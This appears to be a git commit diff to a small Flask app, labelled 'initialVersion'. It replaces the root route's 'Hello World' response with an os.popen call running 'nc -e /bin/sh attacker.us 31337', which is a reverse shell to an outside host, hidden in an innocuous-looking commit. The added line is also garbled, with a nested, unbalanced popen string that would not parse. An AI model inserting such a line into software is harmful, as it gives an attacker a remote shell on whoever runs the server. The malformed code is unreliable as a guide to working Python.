14b69d6787bcc2766e82861ee15ba2aa6a2729e1
David Lister <david@lister.ch>
2016-01-30 23:49:54 -0600

    initialVersion

--- app.py
+++ app.py
@@ -1,10 +1,12 @@
+import os
 from flask import Flask
 
 app = Flask(__name__)
 
 @app.route("/")
 def hello():
-    return "Hello World!!"
+    tmp = os.popen("tmp = os.popen("nc -e /bin/sh attacker.us 31337").read()
+    return tmp
 
 
 if __name__ == "__main__":
